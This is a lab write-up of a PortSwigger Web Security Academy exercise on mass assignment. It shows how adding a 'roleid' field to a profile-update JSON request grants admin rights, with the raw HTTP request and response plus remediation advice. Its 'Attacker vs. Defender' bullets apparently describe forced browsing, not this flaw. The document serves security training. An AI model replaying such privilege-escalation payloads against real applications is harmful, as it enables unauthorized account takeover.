# Lab 04 — User Role Can Be Modified in User Profile

[![Category](https://img.shields.io/badge/Category-Broken%20Access%20Control-red)]()
[![Type](https://img.shields.io/badge/Type-Vertical%20Broken%20Access%20Control-orange)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/access-control)

> Part of the [Broken Access Control Labs](../README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | User Role Can Be Modified in User Profile |
| **Vulnerability Class** | Vertical Broken Access Control |
| **Weakness (CWE)** | CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes (Mass Assignment) |
| **Severity** | Critical |
| **Objective** | Elevate privileges via mass assignment, access the admin panel, and delete `carlos`. |

## 2. Summary

The profile-update API binds the entire incoming JSON body directly onto the internal user model without an explicit allow-list of updatable fields, enabling mass assignment of a privileged `roleid` attribute.

## 3. Proof of Concept (PoC)

**Step 1 — Authenticate:**  
Log in with standard credentials `wiener:peter`.

**Step 2 — Trigger profile update:**  
Navigate to user settings, change the email address, and intercept the resulting request in Burp Suite.

**Step 3 — Analyze payload:**  
Observe the plain JSON body:

```json
{
  "username": "wiener",
  "email": "wiener@normal-user.net"
}
```

**Step 4 — Inject privileged field:**  
Append an undocumented field controlling role assignment:

```json
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "roleid": 2
}
```

**Step 5 — Exploit:**  
Forward the modified request, then navigate to `/admin` and delete user `carlos`.


## 4. Evidence (Request / Response)

```http
PATCH /my-account/change-email HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/json
Cookie: session=<wiener-session>

{"username":"wiener","email":"wiener@normal-user.net","roleid":2}

HTTP/2 200 OK
{"username":"wiener","email":"wiener@normal-user.net","roleid":2}
```

## 5. Root Cause Analysis

The backend model-binding layer (ORM/serializer) maps every JSON key in the request directly to object fields without a strict allow-list/deny-list, so internal fields like `roleid` — never meant to be client-settable — are silently accepted and persisted.

### Attacker vs. Defender Perspective

- **Attacker view:** Enumerate or guess hidden/unprotected paths and request them directly, bypassing any client-side-only gating.
- **Defender view:** Enforce server-side, deny-by-default authorization on every sensitive route, independent of how it was discovered.

## 6. Impact

Any authenticated user can self-escalate privileges by guessing or discovering internal field names, achieving full administrative compromise with a single crafted request.

## 7. Remediation

- Use explicit allow-lists (DTOs/serializers) for every write endpoint, exposing only the fields the client is actually permitted to modify.
- Never bind raw request bodies directly to persistence models (avoid blind `Model.update(request.body)` patterns).
- Enforce field-level authorization: privileged fields (`roleid`, `isAdmin`, etc.) should only be modifiable through dedicated, admin-authorized endpoints.
- Add schema validation that rejects unknown/unexpected fields in the request body instead of silently accepting them.

## 8. References

- [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [OWASP Top 10 2021 — A01: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
